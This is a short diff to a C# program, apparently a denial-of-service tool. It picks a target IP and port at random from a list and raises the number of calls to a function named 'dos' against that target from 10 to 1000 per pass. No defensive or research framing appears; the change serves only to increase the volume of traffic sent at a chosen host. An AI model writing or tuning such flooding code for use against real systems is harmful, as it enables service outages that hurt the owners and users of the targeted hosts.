@@ -86,7 +86,7 @@ namespace WindowsFormsApp13
                 Console.WriteLine("------------------------------------------------------------------------------");
 
                 Console.WriteLine("------------------------------------------------------------------------------");
-                for (int i = 0; i < 5; i++)
+                for (int i = 0; i < 1; i++)
                 {
                     
                         Random rnd = new Random();
@@ -95,7 +95,7 @@ namespace WindowsFormsApp13
                         
                         string ip = strrs[pos].Split(new char[] { ':' })[0];
                         int port = int.Parse(strrs[pos].Split(new char[] { ':' })[1]);
-                    for (int dx = 0; dx < 10; dx++)
+                    for (int dx = 0; dx < 1000; dx++)
                     {
                         var ddo = dos(ip, port);
                         tmres.Add(ddo);
